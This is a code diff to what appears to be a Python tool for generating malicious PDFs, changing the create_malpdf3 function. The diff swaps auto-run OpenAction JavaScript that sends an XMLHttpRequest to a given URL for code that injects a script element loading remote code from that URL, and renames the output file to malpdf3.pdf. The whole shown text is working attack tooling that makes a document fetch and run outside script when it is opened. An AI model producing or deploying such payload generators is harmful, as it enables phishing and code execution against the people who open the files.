@@ -34,23 +34,13 @@ def create_malpdf3(filename, url):
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
         <</S /JavaScript /JS (
-        app.alert(1);
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "{url}", true);
-        xhr.onreadystatechange = function() {{
-            if (xhr.readyState == 4 && xhr.status == 200) {{
-                app.alert("OK");
-            }} else if (xhr.readyState == 4) {{
-                app.alert("Error: " + xhr.status);
-            }}
-        }};
-        xhr.send();
-        app.alert(2);
+        var script = document.createElement('script');
+        script.src = "{url}";
+        document.head.appendChild(script);
         )>> 
         trailer
         <</Root 1 0 R>>''')
-        print("[+] Created xssPDF-3.pdf")
-
+        print("[+] Created malpdf3.pdf")
 
 def create_malpdf_input(filename, script):
     with open(filename, "w") as file:
